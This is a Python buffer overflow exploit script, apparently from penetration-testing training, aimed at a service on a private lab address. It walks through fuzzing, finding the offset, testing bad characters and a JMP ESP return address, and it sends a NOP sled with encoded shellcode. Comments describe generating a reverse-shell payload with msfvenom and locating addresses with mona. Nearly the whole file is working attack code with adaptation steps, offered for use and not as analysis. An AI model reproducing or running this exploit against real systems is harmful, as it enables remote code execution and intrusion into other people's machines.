#!/usr/bin/python

import socket

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
current_step = 7
server = "10.11.21.49"
port = 5555
buffer_size = 1100
offset = 1040
buffer_increased_size = buffer_size + 350
bad_chars = ( 
	"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0d\x0e\x0f\x10" 
	"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20" 
	"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30" 
	"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40" 
	"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50" 
	"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60" 
	"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
	"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80" 
	"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90" 
	"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0" 
	"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0" 
	"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0" 
	"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0" 
	"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0" 
	"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0" 
	"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)
return_instruction = "\x71\x1d\xd1\x65"
shellcode = ( 
	"\xdb\xd6\xb8\xc7\x8a\xfd\x96\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1"
"\x52\x83\xea\xfc\x31\x42\x13\x03\x85\x99\x1f\x63\xf5\x76\x5d"
"\x8c\x05\x87\x02\x04\xe0\xb6\x02\x72\x61\xe8\xb2\xf0\x27\x05"
"\x38\x54\xd3\x9e\x4c\x71\xd4\x17\xfa\xa7\xdb\xa8\x57\x9b\x7a"
"\x2b\xaa\xc8\x5c\x12\x65\x1d\x9d\x53\x98\xec\xcf\x0c\xd6\x43"
"\xff\x39\xa2\x5f\x74\x71\x22\xd8\x69\xc2\x45\xc9\x3c\x58\x1c"
"\xc9\xbf\x8d\x14\x40\xa7\xd2\x11\x1a\x5c\x20\xed\x9d\xb4\x78"
"\x0e\x31\xf9\xb4\xfd\x4b\x3e\x72\x1e\x3e\x36\x80\xa3\x39\x8d"
"\xfa\x7f\xcf\x15\x5c\x0b\x77\xf1\x5c\xd8\xee\x72\x52\x95\x65"
"\xdc\x77\x28\xa9\x57\x83\xa1\x4c\xb7\x05\xf1\x6a\x13\x4d\xa1"
"\x13\x02\x2b\x04\x2b\x54\x94\xf9\x89\x1f\x39\xed\xa3\x42\x56"
"\xc2\x89\x7c\xa6\x4c\x99\x0f\x94\xd3\x31\x87\x94\x9c\x9f\x50"
"\xda\xb6\x58\xce\x25\x39\x99\xc7\xe1\x6d\xc9\x7f\xc3\x0d\x82"
"\x7f\xec\xdb\x05\x2f\x42\xb4\xe5\x9f\x22\x64\x8e\xf5\xac\x5b"
"\xae\xf6\x66\xf4\x45\x0d\xe1\xf1\x92\x0d\x82\x6d\xa7\x0d\x65"
"\xd5\x2e\xeb\x0f\x39\x67\xa4\xa7\xa0\x22\x3e\x59\x2c\xf9\x3b"
"\x59\xa6\x0e\xbc\x14\x4f\x7a\xae\xc1\xbf\x31\x8c\x44\xbf\xef"
"\xb8\x0b\x52\x74\x38\x45\x4f\x23\x6f\x02\xa1\x3a\xe5\xbe\x98"
"\x94\x1b\x43\x7c\xde\x9f\x98\xbd\xe1\x1e\x6c\xf9\xc5\x30\xa8"
"\x02\x42\x64\x64\x55\x1c\xd2\xc2\x0f\xee\x8c\x9c\xfc\xb8\x58"
"\x58\xcf\x7a\x1e\x65\x1a\x0d\xfe\xd4\xf3\x48\x01\xd8\x93\x5c"
"\x7a\x04\x04\xa2\x51\x8c\x34\xe9\xfb\xa5\xdc\xb4\x6e\xf4\x80"
"\x46\x45\x3b\xbd\xc4\x6f\xc4\x3a\xd4\x1a\xc1\x07\x52\xf7\xbb"
"\x18\x37\xf7\x68\x18\x12"
)

def set_buffer(step):
	return {
		1:["A"],
		2:'A' * offset + "B" * 4 + "C" * (buffer_size - 4 - offset),
		3:'A' * offset + "B" * 4 + "C" * (buffer_size - 4 - offset),
		4:'A' * offset + "B" * 4 + "C" * (buffer_increased_size - 4 - offset),
		5:'A' * offset + "B" * 4 + bad_chars,
		6:'A' * offset + return_instruction + "C" * (buffer_increased_size - 4 - offset),
		7:'A' * offset + return_instruction + "\x90" * 8 + shellcode
	}[step]

buffer = set_buffer(current_step)

'''
# Step 1 fuzzing the overflow size
## NOTE: buffer_size = "buffer_size"

counter = 100
##Create an array of buffers, from 1 to 5900, with increments of 200.
while len(buffer) <= 30:
	buffer.append("A"*counter)
	counter=counter+200

for string in buffer:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect=s.connect((server, port))
	s.recv(1024)
	s.send('Fuzzing\r\n')
	s.recv(1024)
	s.send('Overflow ' + string + '\r\n')
	print "Fuzzing PASS with %s bytes" % len(string)
	s.send('QUIT\r\n')
	s.close()
'''

# Step 2 Replicating the crash
## Verify the code works

# Step 3 Controlling pattern
## /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l buffer_size
## /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l buffer_size -q EIP
## NOTE: buffer = "pattern_create" 
## NOTE: offset = "pattern_offset"

# Step 4 Locating space for shellcode
## Increase around 350-400 bytes for metasploit shellcode, play around but make sure ESP point back to the "C"-buffer
## NOTE: buffer_increased_size = "buffer_increased_size"

# Step 5 Testing for bad characters
## \x00 and \x0A are usually bad
## NOTE: write down which ones they are for the shellcode creation with msfvenom later on

# Step 6 Redirecting execution
## !mona modules
## Find something with False and not 0x00
## Hit 'e' on Immunity debugger, find the DLL and double click it
## Right click and search for JMP ESP command or PUSH ESP RETN series of commands
## If non found hit the 'm' in Immunity debugger
## /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
##	nasm > jmp esp
##	FFE4
## !mona find -s '\xff\xe4' -m <module found earlier> 
## Select Immunity Debugger to go to the address given in the Results of mona find
## NOTE: return_instruction = "return_instruction" --> Little endian vs Big endian
##		x86 is little endian so reverse the 4 hex bytes aka 65d11d71 = "\x71\x1d\xd1\x65"
## Restart the app, find address (search twice due to bugg in ID) and place a breakpoint (F2)
## Verify the "C"'s are at the beginning of the address

# Step 7 Generating the shellcode
## msfvenom -p <payload> (example: windows/shell_reverse_tcp) LHOST=<IP> LPORT=<open_port> EXITFUNC=thread -f c -e x86/shikata_ga_nai -b <bad_chars>

try:
	print "\nSending evil buffer..." 
	s.connect((server, port)) 
	data = s.recv(1024)
	s.send('Hi' +'\r\n') 
	data = s.recv(1024)
	s.send('Overflow ' + buffer + '\r\n')
	s.close()
	print "\nDone!."
	
except:
	print "Could not connect to %s:%s" % (server, str(port))
	
